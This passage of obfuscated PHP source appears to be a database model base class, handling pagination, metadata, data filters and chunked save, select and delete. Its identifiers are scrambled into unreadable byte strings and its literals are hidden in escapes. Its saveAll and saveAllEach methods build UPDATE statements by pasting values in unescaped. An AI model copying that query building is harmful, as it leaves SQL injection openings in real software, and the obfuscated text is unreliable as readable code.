$GLOBALS[$ËáΩÜ¨à[7]][$ËáΩÜ¨à[450]] : !1; $GLOBALS[$ËáΩÜ¨à[451]] = isset($GLOBALS[$ËáΩÜ¨à[7]][$ËáΩÜ¨à[439]]) ? $GLOBALS[$ËáΩÜ¨à[7]][$ËáΩÜ¨à[439]] : !1; $GLOBALS[$ËáΩÜ¨à[7]][$ËáΩÜ¨à[450]] = !1; $GLOBALS[$ËáΩÜ¨à[7]][$ËáΩÜ¨à[439]] = !1; } protected function selectPageRestore() { $ö‡ÁÌÅ≈ =& $_SERVER[ˆë€Ï⁄∂]; if (!isset($GLOBALS[$ö‡ÁÌÅ≈[449]])) { return; } $GLOBALS[$ö‡ÁÌÅ≈[7]][$ö‡ÁÌÅ≈[450]] = $GLOBALS[$ö‡ÁÌÅ≈[449]]; $GLOBALS[$ö‡ÁÌÅ≈[7]][$ö‡ÁÌÅ≈[439]] = $GLOBALS[$ö‡ÁÌÅ≈[451]]; if ($GLOBALS[$ö‡ÁÌÅ≈[7]][$ö‡ÁÌÅ≈[450]] === !1) { unset($GLOBALS[$ö‡ÁÌÅ≈[7]][$ö‡ÁÌÅ≈[450]]); } if ($GLOBALS[$ö‡ÁÌÅ≈[7]][$ö‡ÁÌÅ≈[439]] === !1) { unset($GLOBALS[$ö‡ÁÌÅ≈[7]][$ö‡ÁÌÅ≈[439]]); } unset($GLOBALS[$ö‡ÁÌÅ≈[449]]); unset($GLOBALS[$ö‡ÁÌÅ≈[451]]); } protected function selectPage($¥∑ÅÏ◊ƒ = 200, $™ÿ¸£úÉ = 1) { $ï”é—“Ó =& $_SERVER[ˆë€Ï⁄∂]; global $in; $Ê©˝˚Çå = $this->optionsValue(); $™ÕŸÿ˛¿ = 50000; $¥∑ÅÏ◊ƒ = isset($in[$ï”é—“Ó[450]]) && $in[$ï”é—“Ó[450]] ? $in[$ï”é—“Ó[450]] : $¥∑ÅÏ◊ƒ; if ($¥∑ÅÏ◊ƒ === -1) { $in[$ï”é—“Ó[450]] = !1; $™ÕŸÿ˛¿ = 100000000; $¥∑ÅÏ◊ƒ = $™ÕŸÿ˛¿; } $êü‡æû⁄ = $Ê©˝˚Çå; $êü‡æû⁄[$ï”é—“Ó[452]] = array(); $¥∑ÅÏ◊ƒ = intval($¥∑ÅÏ◊ƒ); $¥∑ÅÏ◊ƒ = $¥∑ÅÏ◊ƒ <= 5 ? 5 : ($¥∑ÅÏ◊ƒ >= $™ÕŸÿ˛¿ ? $™ÕŸÿ˛¿ : $¥∑ÅÏ◊ƒ); $™ÿ¸£úÉ = intval(isset($in[$ï”é—“Ó[439]]) && $in[$ï”é—“Ó[439]] ? $in[$ï”é—“Ó[439]] : $™ÿ¸£úÉ); $™ÿ¸£úÉ = $™ÿ¸£úÉ <= 1 ? 1 : $™ÿ¸£úÉ; $èøú˚·» = array(); $íÔ±ÿÓ‹ = 1; if ($™ÿ¸£úÉ == 1 && $íÔ±ÿÓ‹) { $this->optionsValue($Ê©˝˚Çå); $èøú˚·» = $this->page($™ÿ¸£úÉ, $¥∑ÅÏ◊ƒ)->select(); $ŒﬂˆÜ’‚ = is_array($èøú˚·») ? count($èøú˚·») : 0; if ($ŒﬂˆÜ’‚ < $¥∑ÅÏ◊ƒ) { $Ÿ«‡‡€È = 1; } else { $this->optionsValue($êü‡æû⁄); $ŒﬂˆÜ’‚ = intval($this->count()); $Ÿ«‡‡€È = ceil($ŒﬂˆÜ’‚ / $¥∑ÅÏ◊ƒ); } } else { $this->optionsValue($êü‡æû⁄); $ŒﬂˆÜ’‚ = intval($this->count()); $Ÿ«‡‡€È = ceil($ŒﬂˆÜ’‚ / $¥∑ÅÏ◊ƒ); $™ÿ¸£úÉ = $™ÿ¸£úÉ >= $Ÿ«‡‡€È ? $Ÿ«‡‡€È : $™ÿ¸£úÉ; $this->optionsValue($Ê©˝˚Çå); $èøú˚·» = $this->page($™ÿ¸£úÉ, $¥∑ÅÏ◊ƒ)->select(); } if (!is_array($èøú˚·»)) { $èøú˚·» = array(); } if ($Ÿ«‡‡€È == 1) { $ŒﬂˆÜ’‚ = count($èøú˚·»); } $ˆ®≠√ìË = array($ï”é—“Ó[453] => array($ï”é—“Ó[454] => $ŒﬂˆÜ’‚, $ï”é—“Ó[450] => $¥∑ÅÏ◊ƒ, $ï”é—“Ó[439] => $™ÿ¸£úÉ, $ï”é—“Ó[455] => $Ÿ«‡‡€È), $ï”é—“Ó[456] => $èøú˚·»); return $ˆ®≠√ìË; } protected function checkLength($∑≠ÉŒâ≠, $±Ìﬁ¿™© = 0, $®ˆÙø≤î = '') { $¬¨’¶Ωø =& $_SERVER[ˆë€Ï⁄∂]; $±Ìﬁ¿™© = $±Ìﬁ¿™© ? $±Ìﬁ¿™© : 65536; if (!$∑≠ÉŒâ≠ || strlen($∑≠ÉŒâ≠) < $±Ìﬁ¿™©) { return; } $®ˆÙø≤î = $®ˆÙø≤î ? $®ˆÙø≤î . $¬¨’¶Ωø[84] : $¬¨’¶Ωø[12]; show_json($®ˆÙø≤î . LNG($¬¨’¶Ωø[457]) . "\x28{$±Ìﬁ¿™©}\x29", !1); } protected function metaSet($™¬ü´Ä£, $ﬁ´Êùœ± = null, $°È∑òìã = null) { $‹º›–Ò¯ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->tableMeta || !$™¬ü´Ä£) { return !1; } $áé’Ω®È = $this->tableMeta[$‹º›–Ò¯[458]]; $€ÓÌû∏¶ = $this->tableMeta[$‹º›–Ò¯[459]]; $˘öù—çÓ = Model($€ÓÌû∏¶); $‰≈≤‘ÕÔ = array($áé’Ω®È => $™¬ü´Ä£, $‹º›–Ò¯[460] => $ﬁ´Êùœ±); if (is_null($ﬁ´Êùœ±)) { return $˘öù—çÓ->where(array($áé’Ω®È => $™¬ü´Ä£))->delete(); } if (is_null($°È∑òìã) && is_string($ﬁ´Êùœ±)) { return $˘öù—çÓ->where($‰≈≤‘ÕÔ)->delete(); } $‘‘ç®ˆ• = is_array($ﬁ´Êùœ±) ? $ﬁ´Êùœ± : array(); if (is_string($ﬁ´Êùœ±)) { $‘‘ç®ˆ•[$ﬁ´Êùœ±] = $°È∑òìã; } $¬ô˚Å˘ﬁ = array(); foreach ($‘‘ç®ˆ• as $µ≤çÂ—– => $ÌÄ∞…êÀ) { if (is_null($ÌÄ∞…êÀ) && is_string($µ≤çÂ—–)) { $˘öù—çÓ->where(array($áé’Ω®È => $™¬ü´Ä£, $‹º›–Ò¯[460] => $µ≤çÂ—–))->delete(); continue; } $this->checkLength($ÌÄ∞…êÀ, !1, $€ÓÌû∏¶ . $‹º›–Ò¯[4] . $µ≤çÂ—–); $¬ô˚Å˘ﬁ[] = array($áé’Ω®È => $™¬ü´Ä£, $‹º›–Ò¯[107] => $µ≤çÂ—–, $‹º›–Ò¯[461] => $ÌÄ∞…êÀ); } $ˆ©÷Íö‹ = $‹º›–Ò¯[462] . $€ÓÌû∏¶; CacheLock::lock($ˆ©÷Íö‹); $˘öù—çÓ->where(array($áé’Ω®È => $™¬ü´Ä£))->addAll($¬ô˚Å˘ﬁ, array(), !0); CacheLock::unlock($ˆ©÷Íö‹); return !0; } public function metaGet($…ï„Õ∫, $¿ΩêÄÒ‘ = false) { $®ÿµœ›Ì =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->tableMeta) { return array(); } $¢ä«êÿ◊ = $this->tableMeta[$®ÿµœ›Ì[458]]; $˛∑¡Î¬Ù = Model($this->tableMeta[$®ÿµœ›Ì[459]]); if ($¿ΩêÄÒ‘) { $ò≠ÕÎº§ = array($¢ä«êÿ◊ => $…ï„Õ∫, $®ÿµœ›Ì[107] => $¿ΩêÄÒ‘); return $˛∑¡Î¬Ù->where($ò≠ÕÎº§)->getField($®ÿµœ›Ì[461]); } $ò≠ÕÎº§ = array($¢ä«êÿ◊ => $…ï„Õ∫); $®ﬁ©¨»‚ = $˛∑¡Î¬Ù->field($®ÿµœ›Ì[463])->where($ò≠ÕÎº§)->select(); $®ﬁ©¨»‚ = array_to_keyvalue($®ﬁ©¨»‚, $®ÿµœ›Ì[107], $®ÿµœ›Ì[461]); return $®ﬁ©¨»‚; } private function checkDataAutoHas($‰ÄÂ≤ûÍ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ÔÜŸÔÈ∏) { if (in_array($‰ÄÂ≤ûÍ, explode($_SERVER[ˆë€Ï⁄∂][50], $ÔÜŸÔÈ∏[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$õí◊æØ¢, $”¬Ëù—∑) { $ù‘‚ﬁÇœ =& $_SERVER[ˆë€Ï⁄∂]; if (!is_array($õí◊æØ¢)) { return; } foreach ($this->dataAuto as $‰∏…ü◊√) { $©ÒπÀÖ§ = $‰∏…ü◊√[0]; if (!in_array($”¬Ëù—∑, explode($ù‘‚ﬁÇœ[50], $‰∏…ü◊√[2]))) { continue; } switch (trim($‰∏…ü◊√[3])) { case $ù‘‚ﬁÇœ[407]: case $ù‘‚ﬁÇœ[408]: $Æó®‘˝ﬁ = $‰∏…ü◊√[1]; $√˚ŸŸéó = isset($‰∏…ü◊√[4]) ? (array) $‰∏…ü◊√[4] : array(); if ($Æó®‘˝ﬁ == $ù‘‚ﬁÇœ[216] && array_key_exists($©ÒπÀÖ§, $õí◊æØ¢)) { if (!$õí◊æØ¢[$©ÒπÀÖ§]) { unset($õí◊æØ¢[$©ÒπÀÖ§]); } break; } if (isset($õí◊æØ¢[$©ÒπÀÖ§])) { array_unshift($√˚ŸŸéó, $õí◊æØ¢[$©ÒπÀÖ§]); } if ($ù‘‚ﬁÇœ[407] == $‰∏…ü◊√[3]) { $õí◊æØ¢[$©ÒπÀÖ§] = call_user_func_array($Æó®‘˝ﬁ, $√˚ŸŸéó); } else { $õí◊æØ¢[$©ÒπÀÖ§] = call_user_func_array(array(&$this, $Æó®‘˝ﬁ), $√˚ŸŸéó); } break; case $ù‘‚ﬁÇœ[358]: if (isset($õí◊æØ¢[$©ÒπÀÖ§]) && $õí◊æØ¢[$©ÒπÀÖ§]) { $õí◊æØ¢[$©ÒπÀÖ§] = call_user_func_array(array(&$this, $‰∏…ü◊√[1]), array($õí◊æØ¢[$©ÒπÀÖ§])); } break; case $ù‘‚ﬁÇœ[361]: $õí◊æØ¢[$©ÒπÀÖ§] = $õí◊æØ¢[$‰∏…ü◊√[1]]; break; case $ù‘‚ﬁÇœ[380]: if (isset($õí◊æØ¢[$©ÒπÀÖ§]) && !is_string($õí◊æØ¢[$©ÒπÀÖ§])) { $õí◊æØ¢[$©ÒπÀÖ§] = json_encode_force($õí◊æØ¢[$©ÒπÀÖ§]); } break; case $ù‘‚ﬁÇœ[409]: if ($õí◊æØ¢[$©ÒπÀÖ§] === $ù‘‚ﬁÇœ[12]) { unset($õí◊æØ¢[$©ÒπÀÖ§]); } break; case $ù‘‚ﬁÇœ[410]: $õí◊æØ¢[$©ÒπÀÖ§] = $‰∏…ü◊√[1]; default: break; } } if ($”¬Ëù—∑ == $ù‘‚ﬁÇœ[441]) { $‚Å˙Çº® = strtolower($this->db->getDbType()); if (strpos($‚Å˙Çº®, $ù‘‚ﬁÇœ[13]) !== 0) { return; } $À˛¿–µ« = $this->field(!0)->fields; $êñö∑é⁄ = $À˛¿–µ«[$ù‘‚ﬁÇœ[340]]; if (isset($À˛¿–µ«[$ù‘‚ﬁÇœ[339]])) { unset($êñö∑é⁄[$À˛¿–µ«[$ù‘‚ﬁÇœ[339]]]); } foreach ($êñö∑é⁄ as $˜ﬁöΩˆú => $”¬Ëù—∑) { if (!isset($õí◊æØ¢[$˜ﬁöΩˆú])) { $õí◊æØ¢[$˜ﬁöΩˆú] = $ù‘‚ﬁÇœ[12]; } } } } private function dataAfterFilter(&$é∂ÔÉ÷«) { $œÛ‡§⁄ﬁ =& $_SERVER[ˆë€Ï⁄∂]; foreach ($this->dataAuto as $ØÔØ≤µë) { $¶∂«øª⁄ = $ØÔØ≤µë[0]; if (!isset($é∂ÔÉ÷«[$¶∂«øª⁄])) { continue; } if (!in_array($œÛ‡§⁄ﬁ[443], explode($œÛ‡§⁄ﬁ[50], $ØÔØ≤µë[2]))) { continue; } switch (trim($ØÔØ≤µë[3])) { case $œÛ‡§⁄ﬁ[407]: case $œÛ‡§⁄ﬁ[408]: $ø‘≠ˆÔ¨ = isset($ØÔØ≤µë[4]) ? (array) $ØÔØ≤µë[4] : array(); array_unshift($ø‘≠ˆÔ¨, $é∂ÔÉ÷«[$¶∂«øª⁄]); if (isset($ØÔØ≤µë[4]) && $ØÔØ≤µë[4] == $œÛ‡§⁄ﬁ[464]) { $ø‘≠ˆÔ¨ = array($é∂ÔÉ÷«[$¶∂«øª⁄]); } if ($œÛ‡§⁄ﬁ[407] == $ØÔØ≤µë[3]) { $é∂ÔÉ÷«[$¶∂«øª⁄] = call_user_func_array($ØÔØ≤µë[1], $ø‘≠ˆÔ¨); } else { $é∂ÔÉ÷«[$¶∂«øª⁄] = call_user_func_array(array(&$this, $ØÔØ≤µë[1]), $ø‘≠ˆÔ¨); } break; case $œÛ‡§⁄ﬁ[358]: if (isset($é∂ÔÉ÷«[$¶∂«øª⁄]) && $é∂ÔÉ÷«[$¶∂«øª⁄]) { $é∂ÔÉ÷«[$¶∂«øª⁄] = call_user_func_array(array(&$this, $ØÔØ≤µë[1]), array($é∂ÔÉ÷«[$¶∂«øª⁄])); } break; case $œÛ‡§⁄ﬁ[361]: $é∂ÔÉ÷«[$¶∂«øª⁄] = $é∂ÔÉ÷«[$ØÔØ≤µë[1]]; break; case $œÛ‡§⁄ﬁ[380]: $¿æÇã¢Ô = $é∂ÔÉ÷«[$¶∂«øª⁄]; $é∂ÔÉ÷«[$¶∂«øª⁄] = json_decode($¿æÇã¢Ô, !0); if (is_null($é∂ÔÉ÷«[$¶∂«øª⁄])) { $é∂ÔÉ÷«[$¶∂«øª⁄] = $¿æÇã¢Ô; } break; case $œÛ‡§⁄ﬁ[409]: if ($é∂ÔÉ÷«[$¶∂«øª⁄] === $œÛ‡§⁄ﬁ[12]) { unset($é∂ÔÉ÷«[$¶∂«øª⁄]); } break; case $œÛ‡§⁄ﬁ[410]: $é∂ÔÉ÷«[$¶∂«øª⁄] = $ØÔØ≤µë[1]; break; default: break; } } } public function saveAll($∂¬è‡õ≠) { $Äñ§∆–ˆ =& $_SERVER[ˆë€Ï⁄∂]; $Ç˚‹∑Ë≠ = $this->tablePrefix . $this->tableName; $˘∫å÷Ãë = self::SQL_WHERE_IN_CHUNK; $∂¬è‡õ≠ = is_array($∂¬è‡õ≠) ? $∂¬è‡õ≠ : array(); $°∑´ƒè— = $Äñ§∆–ˆ[465]; $æÃàÍ™æ = 0; $·Ê§‡ˆú = array(); $£∆ßÛ±É = count($∂¬è‡õ≠); for ($£ú£’ï™ = 0; $£ú£’ï™ < $£∆ßÛ±É; $£ú£’ï™++) { $»ØüÏ°¬ = $∂¬è‡õ≠[$£ú£’ï™]; if (!is_array($»ØüÏ°¬) || count($»ØüÏ°¬) != 4) { continue; } $≤£©¨≠„ = "\x55\120\x44\101\124\105\40\140{$Ç˚‹∑Ë≠}\x60\40\123\105\124\40{$»ØüÏ°¬[2]}\40\75\x20\x43\x41\x53\x45\x20{$»ØüÏ°¬[0]}\x20\12"; if ($æÃàÍ™æ == 0) { $°∑´ƒè— = $≤£©¨≠„; } $·Ê§‡ˆú[] = $Äñ§∆–ˆ[131] . $»ØüÏ°¬[1] . $Äñ§∆–ˆ[131]; $æÃàÍ™æ++; $°∑´ƒè— .= "\40\x57\x48\x45\x4e\40\47{$»ØüÏ°¬[1]}\x27\x20\124\x48\105\x4e\40\47{$»ØüÏ°¬[3]}\47\40\xa"; if ($æÃàÍ™æ == $˘∫å÷Ãë || $£ú£’ï™ == $£∆ßÛ±É - 1) { $Ê¯£–°£ = implode($Äñ§∆–ˆ[50], $·Ê§‡ˆú); $°∑´ƒè— .= "\x20\105\x4e\x44\40\x20\127\110\x45\122\105\40{$»ØüÏ°¬[0]}\40\x49\x4e\x20\50{$Ê¯£–°£}\x29\40"; $this->execute($°∑´ƒè—); $æÃàÍ™æ = 0; $°∑´ƒè— = $≤£©¨≠„; $this->chunkEventCheck(count($·Ê§‡ˆú)); $·Ê§‡ˆú = array(); } } $this->chunkEventSet(); } public function saveAllEach($‚ç•ÜπÅ) { $Üˆ∞¿ª˝ =& $_SERVER[ˆë€Ï⁄∂]; $‡≠‰¢Ïó = $this->tablePrefix . $this->tableName; foreach ($‚ç•ÜπÅ as $ƒêØ‹É·) { if (!is_array($ƒêØ‹É·) || count($ƒêØ‹É·) != 4) { continue; } $âÂÆÑì· = $ƒêØ‹É·[0] . $Üˆ∞¿ª˝[466] . $ƒêØ‹É·[1] . $Üˆ∞¿ª˝[131]; $˛óï˛€÷ = $ƒêØ‹É·[2] . $Üˆ∞¿ª˝[466] . $ƒêØ‹É·[3] . $Üˆ∞¿ª˝[131]; $Œ“É≥ﬂÇ = "\165\160\x64\141\x74\x65\40{$‡≠‰¢Ïó}\40\163\145\x74\x20{$˛óï˛€÷}\x20\167\x68\x65\x72\145\x20{$âÂÆÑì·}\73"; $this->execute($Œ“É≥ﬂÇ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($®ÛØ‹’ì = false, $÷çÜèãÈ = false) { $this->_chunkEvent = $®ÛØ‹’ì; $this->_chunkEventParam = $÷çÜèãÈ; } private function chunkEventCheck($Û’Ç∑°˚) { if (!$this->_chunkEvent) { return; } $ÇÊ√Ü¬¨ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ÇÊ√Ü¬¨[$_SERVER[ˆë€Ï⁄∂][467]] = $Û’Ç∑°˚; Hook::trigger($this->_chunkEvent, $ÇÊ√Ü¬¨); } public function addAll($»—“Œ∞ò, $Ÿ˘Ù‚§’ = array(), $ÈÖ¸ﬁ·™ = false) { $åìõ˙è¸ =& $_SERVER[ˆë€Ï⁄∂]; ignore_timeout(); $ÒÚ’à»¸ = self::SQL_WHERE_IN_CHUNK; if (empty($»—“Œ∞ò)) { $this->error = think_lang($åìõ˙è¸[359]); return !1; } $Ÿ˘Ù‚§’ = $this->_parseOptions($Ÿ˘Ù‚§’); foreach ($»—“Œ∞ò as $πòùèÂ⁄ => $Õ¸Òß´√) { $»—“Œ∞ò[$πòùèÂ⁄] = $this->_facade($Õ¸Òß´√); $this->_beforeInsert($»—“Œ∞ò[$πòùèÂ⁄], $Ÿ˘Ù‚§’); } if (method_exists($this->db, $åìõ˙è¸[360])) { for ($µ›£∫èé = 0; $µ›£∫èé < count($»—“Œ∞ò); $µ›£∫èé += $ÒÚ’à»¸) { $ÎúÇÓ‚º = array_slice($»—“Œ∞ò, $µ›£∫èé, $ÒÚ’à»¸); if (!is_array($ÎúÇÓ‚º) || count($ÎúÇÓ‚º) == 0) { break; } $√ Ô¸˚Å = $this->db->insertAll($ÎúÇÓ‚º, $Ÿ˘Ù‚§’, $ÈÖ¸ﬁ·™); $this->chunkEventCheck(count($ÎúÇÓ‚º)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($»—“Œ∞ò as $πòùèÂ⁄ => $Õ¸Òß´√) { $√ Ô¸˚Å = $this->db->insert($Õ¸Òß´√, $Ÿ˘Ù‚§’, $ÈÖ¸ﬁ·™); } $this->commit(); } if (!1 !== $√ Ô¸˚Å) { $™≈¿º√« = $this->getLastInsID(); if ($™≈¿º√«) { return $™≈¿º√«; } } return $√ Ô¸˚Å; } public function save($……®»Àù = '', $Ëû•”ƒâ = array()) { $ﬂœ÷òó„ =& $_SERVER[ˆë€Ï⁄∂]; $¬óêÄÒ = self::SQL_WHERE_IN_CHUNK; $áºÁáÔ⁄ = $this->optionsValue(); $»¡°å˛◊ = $this->findWhereField($áºÁáÔ⁄); if (!$»¡°å˛◊) { return parent::save($……®»Àù, $Ëû•”ƒâ); } $¯Ó•€Ô = 0; $ùô¡óäú = $áºÁáÔ⁄[$ﬂœ÷òó„[363]][$»¡°å˛◊][1]; $ùô¡óäú = is_array($ùô¡óäú) ? $ùô¡óäú : array(); $¶‡èˆ≥æ = count($ùô¡óäú); for ($ºÕÕœÕ¶ = 0; $ºÕÕœÕ¶ < $¶‡èˆ≥æ; $ºÕÕœÕ¶ += $¬óêÄÒ) { $øÎÆ›‹î = array_slice($ùô¡óäú, $ºÕÕœÕ¶, $¬óêÄÒ); if (!is_array($øÎÆ›‹î) || count($øÎÆ›‹î) == 0) { break; } $áºÁáÔ⁄[$ﬂœ÷òó„[363]][$»¡°å˛◊][1] = $øÎÆ›‹î; $this->optionsValue($áºÁáÔ⁄); $¯Ó•€Ô += parent::save($……®»Àù, $Ëû•”ƒâ); $this->chunkEventCheck(count($øÎÆ›‹î)); } $this->chunkEventSet(); return $¯Ó•€Ô; } public function add($˘°‚•¢Ï = '', $êô‹üµÅ = array(), $”àÇ€œÒ = false) { if ($this->addTaskStatus && is_array($˘°‚•¢Ï)) { $this->addTaskData[] = $˘°‚•¢Ï; return; } return parent::add($˘°‚•¢Ï, $êô‹üµÅ, $”àÇ€œÒ); } public function parseWhereLike($∞—≈ó∆õ, $∞ãí’«ø = '', $„ôÉ ⁄¶ = false, &$êÑ¥ÿâ≠ = false) { $ï≤ÑŸ€¨ =& $_SERVER[ˆë€Ï⁄∂]; $œ“¿»≤› = $GLOBALS[$ï≤ÑŸ€¨[6]][$ï≤ÑŸ€¨[468]]; if (!$œ“¿»≤›[$ï≤ÑŸ€¨[469]]) { return $∞—≈ó∆õ; } if (!is_array($∞—≈ó∆õ)) { return $∞—≈ó∆õ; } $êÏ¯∆≤¨ = array(); $éÒ˝Ïë∆ = 0; foreach ($∞—≈ó∆õ as $›‹÷¬¶≠ => $¬ªÏ‹‡‡) { if (is_array($¬ªÏ‹‡‡) && count($¬ªÏ‹‡‡) == 2 && $¬ªÏ‹‡‡[0] == $ï≤ÑŸ€¨[470] && is_string($¬ªÏ‹‡‡[1]) && substr($¬ªÏ‹‡‡[1], 0, 1) == $ï≤ÑŸ€¨[471] && substr($¬ªÏ‹‡‡[1], strlen($¬ªÏ‹‡‡[1]) - 1, 1) == $ï≤ÑŸ€¨[471]) { $êÑ¥ÿâ≠ = !0; $”ó©Œ…ë = is_string($›‹÷¬¶≠) ? $›‹÷¬¶≠ : $∞ãí’«ø; $´ôÎü›√ = substr($¬ªÏ‹‡‡[1], 1, strlen($¬ªÏ‹‡‡[1]) - 2); $´ôÎü›√ = $this->db->escapeString($´ôÎü›√); if (!strpos($”ó©Œ…ë, $ï≤ÑŸ€¨[10])) { $”ó©Œ…ë = $ï≤ÑŸ€¨[472] . $”ó©Œ…ë . $ï≤ÑŸ€¨[472]; } $±©æéåÌ = $ï≤ÑŸ€¨[232] . $´ôÎü›√ . $ï≤ÑŸ€¨[232]; $´ôÎü›√ = str_replace(array($ï≤ÑŸ€¨[10], $ï≤ÑŸ€¨[473], $ï≤ÑŸ€¨[11]), $ï≤ÑŸ€¨[474], $´ôÎü›√); if ($œ“¿»≤›[$ï≤ÑŸ€¨[475]]) { $±©æéåÌ = $ï≤ÑŸ€¨[476] . $´ôÎü›√ . $ï≤ÑŸ€¨[477]; if ($œ“¿»≤›[$ï≤ÑŸ€¨[478]]) { $±©æéåÌ = $ï≤ÑŸ€¨[477] . $´ôÎü›√ . $ï≤ÑŸ€¨[476]; } } $êÏ¯∆≤¨[$éÒ˝Ïë∆] = $ï≤ÑŸ€¨[479] . $”ó©Œ…ë . $ï≤ÑŸ€¨[480] . $±©æéåÌ . $ï≤ÑŸ€¨[481]; $éÒ˝Ïë∆++; continue; } if (is_array($¬ªÏ‹‡‡)) { $∞ãí’«ø = is_string($›‹÷¬¶≠) ? $›‹÷¬¶≠ : $∞ãí’«ø; $¬ªÏ‹‡‡ = $this->parseWhereLike($¬ªÏ‹‡‡, $∞ãí’«ø, !0, $êÑ¥ÿâ≠); } if (is_numeric($›‹÷¬¶≠)) { $êÏ¯∆≤¨[$éÒ˝Ïë∆] = $¬ªÏ‹‡‡; $éÒ˝Ïë∆++; } else { $êÏ¯∆≤¨[$›‹÷¬¶≠] = $¬ªÏ‹‡‡; } } if ($êÑ¥ÿâ≠ && !$„ôÉ ⁄¶) { } return $êÏ¯∆≤¨; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($™º˝≈¢Î = array()) { $Â∫ÄÅâ… =& $_SERVER[ˆë€Ï⁄∂]; $—ñ˘˜Ú¢ = self::SQL_WHERE_IN_CHUNK; $¨‚ø˝ñﬂ = $this->optionsValue(); $–ÌÓêË÷ = $this->findWhereField($¨‚ø˝ñﬂ); if (!$–ÌÓêË÷ || isset($¨‚ø˝ñﬂ[$Â∫ÄÅâ…[378]]) || isset($¨‚ø˝ñﬂ[$Â∫ÄÅâ…[439]])) { return parent::select($™º˝≈¢Î); } $≥ª˘Ÿéë = $¨‚ø˝ñﬂ[$Â∫ÄÅâ…[363]][$–ÌÓêË÷][1]; $≥ª˘Ÿéë = is_array($≥ª˘Ÿéë) ? $≥ª˘Ÿéë : array(); $Ãï˘Ïøô = null; for ($ô•∫¢Å¡ = 0; $ô•∫¢Å¡ < count($≥ª˘Ÿéë); $ô•∫¢Å¡ += $—ñ˘˜Ú¢) { $˙™≤Øƒﬁ = array_slice($≥ª˘Ÿéë, $ô•∫¢Å¡, $—ñ˘˜Ú¢); if (!is_array($˙™≤Øƒﬁ) || count($˙™≤Øƒﬁ) == 0) { break; } $¨‚ø˝ñﬂ[$Â∫ÄÅâ…[363]][$–ÌÓêË÷][1] = $˙™≤Øƒﬁ; $this->optionsValue($¨‚ø˝ñﬂ); $ê £¨Ô± = parent::select($™º˝≈¢Î); if (!$ê £¨Ô±) { continue; } $Ãï˘Ïøô = is_array($Ãï˘Ïøô) ? $Ãï˘Ïøô : array(); $Ãï˘Ïøô = array_merge($Ãï˘Ïøô, $ê £¨Ô±); } return $Ãï˘Ïøô; } public function delete($·¶É“≠Ü = array()) { $ ®†ôèæ =& $_SERVER[ˆë€Ï⁄∂]; $à‰±›’ï = self::SQL_WHERE_IN_CHUNK; $Í‹Âƒâ∂ = $this->optionsValue(); $◊â÷∑‘· = $this->findWhereField($Í‹Âƒâ∂); if (!$◊â÷∑‘·) { return parent::delete($·¶É“≠Ü); } $¸ê¬ä∑‘ = 0; $Å∂»ﬂ‚∂ = $Í‹Âƒâ∂[$ ®†ôèæ[363]][$◊â÷∑‘·][1]; $Å∂»ﬂ‚∂ = is_array($Å∂»ﬂ‚∂) ? $Å∂»ﬂ‚∂ : array(); for ($˜Ú«ﬂ∑í = 0; $˜Ú«ﬂ∑í < count($Å∂»ﬂ‚∂); $˜Ú«ﬂ∑í += $à‰±›’ï) { $≈ã©ú = array_slice($Å∂»ﬂ‚∂, $˜Ú«ﬂ∑í, $à‰±›’ï); if (!is_array($≈ã©ú) || count($≈ã©ú) == 0) { break; } $Í‹Âƒâ∂[$ ®†ôèæ[363]][$◊â÷∑‘·][1] = $≈ã©ú; $this->optionsValue($Í‹Âƒâ∂); $¸ê¬ä∑‘ += parent::delete($·¶É“≠Ü); } return $¸ê¬ä∑‘; } private function findWhereField($º∑˘ﬁìØ) { $◊§éòÔ =& $_SERVER[ˆë€Ï⁄∂]; $´Ö–ë¶Ä = self::SQL_WHERE_IN_CHUNK; if (!is_array($º∑˘ﬁìØ) || !is_array($º∑˘ﬁìØ[$◊§éòÔ[363]])) { return !1; } foreach ($º∑˘ﬁìØ[$◊§éòÔ[363]] as $Œ˝˙„ØΩ => $º≠É≠Ü∆) { if (is_array($º≠É≠Ü∆) && isset($º≠É≠Ü∆[0]) && is_string($º≠É≠Ü∆[0]) && strtolower($º≠É≠Ü∆[0]) == $◊§éòÔ[7] && is_array($º≠É≠Ü∆[1]) && count($º≠É≠Ü∆[1]) > $´Ö–ë¶Ä) { ignore_timeout(); return $Œ˝˙„ØΩ; } } return !1; } public function setMasterDB($√ﬂí•ÜÄ = true) { think_config($_SERVER[ˆë€Ï⁄∂][482], $√ﬂí•ÜÄ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\x65\x6d\117\160\164\151\157\x6e"; public $field = array(); public function listData($Ìµ˘ÀöÌ = false, $œèûøﬂî = "\155\x6f\144\x69\146\171\124\151\155\x65", $∑√‹‡’¡ = false) { $‰Óπ•å = Model($this->modelType)->get(!1, $this->optionType, !0); $é¶´òﬂ« = array_values($‰Óπ•å); if ($é¶´òﬂ« && $é¶´òﬂ«[0] && !is_array($é¶´òﬂ«[0])) { Model($this->modelType)->cacheRemove($this->optionType); $‰Óπ•å = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$‰Óπ•å) { return $Ìµ˘ÀöÌ ? null : array(); } if (!$Ìµ˘ÀöÌ) { $‰Óπ•å = array_filter(array_values($‰Óπ•å)); return array_sort_by($‰Óπ•å, $œèûøﬂî, $∑√‹‡’¡); } return $‰Óπ•å[$_SERVER[ˆë€Ï⁄∂][483] . $Ìµ˘ÀöÌ]; } public function insert($€Áπ‡áò) { $öŸ˚˚˜û =& $_SERVER[ˆë€Ï⁄∂]; $€Áπ‡áò = array_field_key($€Áπ‡áò, $this->field); $ñ¶”¡ö≠ = Model($this->modelType)->get($öŸ˚˚˜û[484], $this->optionType . $öŸ˚˚˜û[485]); $ñ¶”¡ö≠ = $ñ¶”¡ö≠ ? $ñ¶”¡ö≠ : 0; $€Áπ‡áò[$öŸ˚˚˜û[486]] = ++$ñ¶”¡ö≠; 